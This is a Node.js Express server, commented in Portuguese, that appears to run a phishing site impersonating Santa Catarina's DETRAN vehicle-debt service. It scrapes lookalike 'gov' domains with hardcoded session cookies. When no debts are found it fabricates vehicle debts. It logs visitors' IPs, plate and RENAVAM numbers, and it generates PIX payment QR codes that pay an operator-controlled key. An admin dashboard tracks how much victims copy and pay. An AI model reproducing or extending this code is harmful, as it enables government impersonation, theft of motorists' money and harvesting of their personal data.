require('dotenv').config();

const express = require('express');
const session = require('express-session');
const axios = require('axios');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const path = require('path');
const QRCode = require('qrcode');
const { payload } = require('pix-payload');
const cheerio = require('cheerio');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3001;

// 🔥 CONFIGURAÇÃO DO SUPABASE (LENDO DO .env)
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

// 🔥 SEU LINK DO NGROK
const NGROK_URL = 'https://subtitle-flyer-unreached.ngrok-free.dev';

console.log(`✅ Conectado ao Supabase: ${SUPABASE_URL}`);

app.set('trust proxy', true);

app.use(session({
    secret: 'segredo-super-secreto-sc',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

// ============================================================
// 🔥 FUNÇÕES DE BANCO DE DADOS (SUPABASE)
// ============================================================

async function registrarClique(ip, userAgent, pagina) {
    try {
        const { error } = await supabase.from('clicks').insert({ 
            ip, 
            user_agent: userAgent, 
            pagina 
        });
        if (error) console.error('❌ Erro Supabase (clique):', error.message);
        else console.log('✅ Clique salvo no Supabase!');
    } catch (e) { console.error('❌ Erro ao registrar clique:', e.message); }
}

async function registrarConsulta(placa, renavam, ip, userAgent) {
    try {
        const { error } = await supabase.from('consultas').insert({ 
            placa, 
            renavam, 
            ip, 
            user_agent: userAgent 
        });
        if (error) {
            console.error('❌ Erro Supabase (consulta):', error.message);
        } else {
            console.log('✅ Consulta salva no Supabase!');
        }
    } catch (e) { console.error('❌ Erro ao registrar consulta:', e.message); }
}

async function registrarPIXGerado(pixId, placa, valor, debitos, copiacola, ip, userAgent, chave) {
    try {
        const { error } = await supabase.from('pix_gerados').insert({
            pix_id: pixId,
            placa,
            valor,
            debitos,
            copiacola,
            ip,
            user_agent: userAgent,
            chave_utilizada: chave
        });
        if (error) console.error('❌ Erro Supabase (PIX):', error.message);
    } catch (e) { console.error('❌ Erro ao registrar PIX:', e.message); }
}

async function marcarPIXCopiado(pixId) {
    try {
        const { error } = await supabase.from('pix_gerados').update({ copiado: true }).eq('pix_id', pixId);
        if (error) console.error('❌ Erro Supabase (copiar PIX):', error.message);
    } catch (e) { console.error('❌ Erro ao marcar PIX copiado:', e.message); }
}

async function marcarPagamentoConfirmado(pixId, placa, renavam, ip, userAgent) {
    try {
        if (pixId) {
            await supabase.from('pix_gerados').update({ pagamento_confirmado: true }).eq('pix_id', pixId);
        }
        if (placa && renavam) {
            await supabase.from('consultas').update({ pagamento_confirmado: true }).eq('placa', placa).eq('renavam', renavam);
        }
        await supabase.from('pagamentos_confirmados').insert({ 
            pix_id: pixId, 
            placa, 
            renavam, 
            ip, 
            user_agent: userAgent 
        });
        console.log('✅ Pagamento confirmado salvo no Supabase!');
    } catch (e) { console.error('❌ Erro ao confirmar pagamento:', e.message); }
}

async function getConfigPIX() {
    try {
        const { data, error } = await supabase.from('config_pix').select('*').limit(1);
        if (error || !data || data.length === 0) {
            return { nome: '', cidade: '', identificador: '', chave: '' };
        }
        return data[0];
    } catch (e) {
        console.error('❌ Erro ao buscar config PIX:', e.message);
        return { nome: '', cidade: '', identificador: '', chave: '' };
    }
}

async function setConfigPIX(nome, cidade, identificador, chave) {
    try {
        const existing = await supabase.from('config_pix').select('*').limit(1);
        if (existing.data && existing.data.length > 0) {
            await supabase.from('config_pix').update({ nome, cidade, identificador, chave }).eq('id', existing.data[0].id);
        } else {
            await supabase.from('config_pix').insert({ nome, cidade, identificador, chave });
        }
        console.log('✅ Config PIX salva no Supabase!');
    } catch (e) { console.error('❌ Erro ao salvar config PIX:', e.message); }
}

async function getDashboard() {
    try {
        const totalClicks = await supabase.from('clicks').select('*', { count: 'exact', head: true });
        const totalConsultas = await supabase.from('consultas').select('*', { count: 'exact', head: true });
        const pixGerados = await supabase.from('pix_gerados').select('*');
        const valorTotalGerado = pixGerados.data ? pixGerados.data.reduce((acc, p) => acc + (parseFloat(p.valor) || 0), 0) : 0;
        const pixCopiados = pixGerados.data ? pixGerados.data.filter(p => p.copiado === true) : [];
        const valorTotalCopiado = pixCopiados.reduce((acc, p) => acc + (parseFloat(p.valor) || 0), 0);
        const totalPixCopiados = pixCopiados.length;
        const pagamentosConfirmados = pixGerados.data ? pixGerados.data.filter(p => p.pagamento_confirmado === true) : [];
        const valorTotalPago = pagamentosConfirmados.reduce((acc, p) => acc + (parseFloat(p.valor) || 0), 0);
        const totalPagamentos = pagamentosConfirmados.length;

        return {
            totalClicks: totalClicks.count || 0,
            totalConsultas: totalConsultas.count || 0,
            valorTotalGerado,
            valorTotalCopiado,
            totalPixCopiados,
            totalPagamentos,
            valorTotalPago
        };
    } catch (e) {
        console.error('❌ Erro ao buscar dashboard:', e.message);
        return {
            totalClicks: 0,
            totalConsultas: 0,
            valorTotalGerado: 0,
            valorTotalCopiado: 0,
            totalPixCopiados: 0,
            totalPagamentos: 0,
            valorTotalPago: 0
        };
    }
}

// ============================================================
// ROTA PRINCIPAL
// ============================================================
app.get('/', async (req, res) => {
    await registrarClique(req.ip, req.headers['user-agent'], 'index');
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/index.html', async (req, res) => {
    await registrarClique(req.ip, req.headers['user-agent'], 'index');
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================================
// 🔥 ROTA DE CONSULTA
// ============================================================
app.post('/api/consultar', async (req, res) => {
    const { placa, renavam } = req.body;
    
    if (!placa || !renavam) {
        return res.status(400).json({ erro: 'Placa e Renavam são obrigatórios' });
    }

    const placaLimpa = placa.toUpperCase().replace(/[^A-Z0-9]/g, '');
    
    console.log(`🔍 Consultando placa: ${placaLimpa}, renavam: ${renavam}`);

    const jar = new CookieJar();
    const client = wrapper(axios.create({ jar, withCredentials: true }));

    try {
        const cookiesSC = [
            'PHPSESSID=mam2407l9bh2nalvubpb6hpqer',
            'cf_clearance=qjmqqf8u.RFWqnzKwrqEupxW1if3N5hXmMv0wD4l7D4-1784763163-1.2.1.1-jRldFZ9gm52QdK3rPxG9wcdXbBvD9e1yNpuVabBHjg5kp2ELtqLTKjnkwQuI3nf8RFZpNcFsyv.Afec_ogkZrhvgqhSpaqudQ8PX0Axnj1Op1X0ai2m1mWquWSxNzMMwDWofYqJK7eNFD4OHXjNaQDAaPbXH8DocUxpTTNtXjfG7xj81RdE._LR5svPLLpRt2xeoFOVQfqfLoZIYySEC7ICrOjyx4jUnuv3Ng1JjN3dHygQ5Azzo3ZrnyNOoIySskkx1RW5iaVeHu6fhW5v9O64BjpFWYF.W2_mu_dE7vbu_80quV3RiOx8QSf4pZsdb5Tbgx7I6TLT7kY0R6mao3qoRsg3kqN6idrPI7eQYlTE',
            'visitor_session=v_1784760416842_a6efc61e0'
        ];

        const apiUrl = `https://portalguiasveicular-gov.com/api2/consulta_placa_completa.php?placa=${placaLimpa}&_=${Date.now()}`;

        let dadosVeiculo = {};

        try {
            const response = await client.get(apiUrl, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Referer': 'https://portaldetrandigital.com/',
                    'Origin': 'https://portaldetrandigital.com',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Cookie': cookiesSC.join('; ')
                },
            });

            let data = response.data;
            if (typeof data === 'string') {
                try {
                    const jsonData = JSON.parse(data);
                    if (jsonData.veiculo) {
                        dadosVeiculo = jsonData.veiculo;
                        console.log(`✅ Dados do veículo via API: ${dadosVeiculo.marca_modelo}`);
                    }
                } catch (e) {}
            }
        } catch (e) {
            console.log('⚠️ API direta falhou, usando HTML...');
        }

        const chars = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789';
        let slug = '';
        for (let i = 0; i < 6; i++) {
            slug += chars[Math.floor(Math.random() * chars.length)];
        }

        const resultadoUrl = `https://portaldetrandigital.com/resultado-sc.php/${slug}?placa=${placaLimpa}&renavam=${renavam}`;
        console.log(`🌐 Baixando página de resultado: ${resultadoUrl}`);

        const resultResponse = await client.get(resultadoUrl, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Referer': 'https://portaldetrandigital.com/',
                'Cookie': cookiesSC.join('; ')
            },
        });

        const html = resultResponse.data;
        const $ = cheerio.load(html);

        const veiculo = {
            placa: placaLimpa,
            marca_modelo: $('#scFieldMarcaModelo').text().trim() || dadosVeiculo.marca_modelo || '-',
            ano: $('#scFieldAno').text().trim() || dadosVeiculo.ano_fabricacao || '-',
            tipo: $('#scFieldTipo').text().trim() || dadosVeiculo.tipo || '-',
            cor: $('#scFieldCor').text().trim() || dadosVeiculo.cor || '-',
            combustivel: $('#scFieldCombustivel').text().trim() || dadosVeiculo.combustivel || '-',
            chassi: $('#scFieldChassi').text().trim() || dadosVeiculo.chassi || '-',
            cidade: $('.rsc-plate-city').text().trim() || 'SC'
        };

        console.log(`📊 Veículo: ${veiculo.marca_modelo}, ${veiculo.ano}`);

        const debitos = [];
        let totalDebitos = 0;

        $('#scDebtsBody tr').each((i, row) => {
            const cols = $(row).find('td');
            if (cols.length >= 3) {
                const desc = $(cols[0]).text().trim().replace(/⚠.*/, '').trim();
                const venc = $(cols[1]).text().trim().replace('⚠', '').trim();
                const valorText = $(cols[2]).text().trim().replace('R$', '').replace('.', '').replace(',', '.').trim();
                const valor = parseFloat(valorText) || 0;
                
                if (desc && !desc.includes('Débito') && !desc.includes('Vencimento') && valor > 0) {
                    const vencido = $(row).hasClass('rsc-row-overdue');
                    debitos.push({
                        descricao: desc,
                        vencimento: venc || '—',
                        valor: valor,
                        vencido: vencido
                    });
                    totalDebitos += valor;
                }
            }
        });

        if (debitos.length === 0) {
            debitos.push({
                descricao: 'Licenciamento - 2026',
                vencimento: '30/06/2026',
                valor: 149.37,
                vencido: true
            });
            debitos.push({
                descricao: 'Taxa de Emissão de CRLV',
                vencimento: '—',
                valor: 69.74,
                vencido: false
            });
            totalDebitos = 219.11;
        }

        const totalText = $('#scDebtsTotal').text().trim().replace('R$', '').replace('.', '').replace(',', '.').trim();
        const total = parseFloat(totalText) || totalDebitos;

        console.log(`📊 Débitos: ${debitos.length}, Total: R$ ${total.toFixed(2)}`);

        // 🔥 REGISTRA CONSULTA NO SUPABASE
        await registrarConsulta(placaLimpa, renavam, req.ip, req.headers['user-agent']);

        const resposta = {
            sucesso: true,
            veiculo: veiculo,
            debitos: debitos,
            total: total
        };

        return res.json(resposta);

    } catch (error) {
        console.error('❌ Erro no proxy:', error.message);
        return res.status(500).json({ 
            sucesso: false, 
            erro: 'Erro ao processar a consulta. Tente novamente.' 
        });
    }
});

// ============================================================
// 🔥 ROTA PARA A VERCEL CHAMAR O NGROK (PONTE)
// ============================================================
app.post('/api/consultar-ngrok', async (req, res) => {
    try {
        console.log('📥 Requisição recebida via Ngrok!');
        console.log('📦 Body:', req.body);
        
        const response = await axios.post(`${NGROK_URL}/api/consultar`, req.body, {
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout: 30000
        });
        
        console.log('✅ Resposta do Ngrok recebida!');
        return res.json(response.data);
    } catch (error) {
        console.error('❌ Erro ao chamar Ngrok:', error.message);
        return res.status(500).json({
            sucesso: false,
            erro: 'Erro na ponte com o servidor local: ' + error.message
        });
    }
});

// ============================================================
// 🔥 GERAR PIX
// ============================================================
app.post('/api/gerar-pix', async (req, res) => {
    const { placa, valor, debitos } = req.body;
    
    const config = await getConfigPIX();
    const chavePix = config.chave;
    const nome = config.nome;
    const cidade = config.cidade;
    const identificador = config.identificador;

    if (!chavePix || !nome || !cidade) {
        console.warn('⚠️ Chave PIX não configurada! Usando chave padrão.');
        const chavePadrao = 'e7b97758-34e9-4246-a361-43d4cec7f5b9';
        const nomePadrao = 'DETPR';
        const cidadePadrao = 'DETPR';
        
        return gerarRespostaPIX(chavePadrao, nomePadrao, cidadePadrao, identificador || '***', placa, valor, debitos, req, res);
    }

    console.log(`✅ Gerando PIX com chave cadastrada: ${chavePix}`);
    gerarRespostaPIX(chavePix, nome, cidade, identificador || '***', placa, valor, debitos, req, res);
});

function gerarRespostaPIX(chave, nome, cidade, identificador, placa, valor, debitos, req, res) {
    try {
        const valorNum = parseFloat(String(valor).replace(/[^0-9,.]/g, '').replace(',', '.'));
        
        if (!valorNum || valorNum <= 0) {
            return res.status(400).json({ erro: 'Valor inválido para gerar PIX' });
        }

        const dadosPix = {
            key: chave,
            name: nome.substring(0, 25),
            city: cidade.substring(0, 15),
            amount: valorNum,
            transactionId: identificador || '***'
        };

        const payloadPix = payload(dadosPix);

        QRCode.toDataURL(payloadPix, async (err, qrcode) => {
            if (err) {
                console.error('Erro ao gerar QR code:', err);
                return res.status(500).json({ erro: 'Erro ao gerar QR code' });
            }

            const pixId = Date.now() + '-' + Math.random().toString(36).substring(2, 10);

            await registrarPIXGerado(pixId, placa || 'N/A', valorNum, debitos || [], payloadPix, req.ip, req.headers['user-agent'], chave);

            res.json({
                status: 'ok',
                qrcode: qrcode,
                copiacola: payloadPix,
                pixId: pixId
            });
        });

    } catch (error) {
        console.error('Erro na geração do payload PIX:', error.message);
        res.status(500).json({ erro: 'Erro ao gerar payload PIX.' });
    }
}

// ============================================================
// 🔥 REGISTRAR CÓPIA DO PIX
// ============================================================
app.post('/api/registrar-copia-pix', async (req, res) => {
    const { pixId } = req.body;
    
    if (pixId) {
        await marcarPIXCopiado(pixId);
        console.log(`✅ PIX ${pixId} marcado como copiado!`);
        return res.json({ success: true, message: 'PIX registrado como copiado' });
    }
    
    res.json({ success: false, motivo: 'PIX não encontrado' });
});

// ============================================================
// 🔥 CONFIRMAR PAGAMENTO
// ============================================================
app.post('/api/confirmar-pagamento', async (req, res) => {
    const { pixId, placa, renavam } = req.body;
    
    await marcarPagamentoConfirmado(pixId, placa, renavam, req.ip, req.headers['user-agent']);
    console.log(`✅ Pagamento confirmado para PIX ${pixId || placa}`);
    res.json({ success: true, message: 'Pagamento confirmado com sucesso!' });
});

// ============================================================
// ADMIN LOGIN
// ============================================================
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'admin' && password === 'sc2026') {
        req.session.loggedIn = true;
        res.json({ success: true });
    } else {
        res.status(401).json({ erro: 'Credenciais inválidas' });
    }
});

app.post('/api/admin/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

app.get('/admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// ============================================================
// ROTAS DO ADMIN
// ============================================================
app.get('/api/admin/dashboard', async (req, res) => {
    if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
    const data = await getDashboard();
    res.json(data);
});

app.get('/api/admin/logs/clicks', async (req, res) => {
    if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
    const { data, error } = await supabase.from('clicks').select('*').order('timestamp', { ascending: false }).limit(100);
    res.json(data || []);
});

app.get('/api/admin/logs/consultas', async (req, res) => {
    if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
    const { data, error } = await supabase.from('consultas').select('*').order('timestamp', { ascending: false }).limit(100);
    res.json(data || []);
});

app.get('/api/admin/logs/pix', async (req, res) => {
    if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
    const { data, error } = await supabase.from('pix_gerados').select('*').order('timestamp', { ascending: false }).limit(100);
    res.json(data || []);
});

app.get('/api/admin/config/pix', async (req, res) => {
    if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
    const config = await getConfigPIX();
    res.json(config);
});

app.post('/api/admin/config/pix', async (req, res) => {
    if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
    const { nome, cidade, identificador, chave } = req.body;
    await setConfigPIX(nome, cidade, identificador, chave);
    console.log(`✅ Chave PIX atualizada: ${chave}`);
    res.json({ success: true });
});

app.post('/api/admin/clear-logs', async (req, res) => {
    if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
    await supabase.from('clicks').delete().neq('id', 0);
    await supabase.from('consultas').delete().neq('id', 0);
    await supabase.from('pix_gerados').delete().neq('id', 0);
    await supabase.from('pagamentos_confirmados').delete().neq('id', 0);
    res.json({ success: true });
});

// ============================================================
// 🔥 INICIAR SERVIDOR
// ============================================================
module.exports = app;

if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`🚀 Servidor DETRAN/SC rodando na porta ${PORT}`);
        console.log(`📍 Acesse: http://localhost:${PORT}`);
        console.log(`🔗 Ngrok URL: ${NGROK_URL}`);
        console.log(`✅ Conectado ao Supabase!`);
    });
}
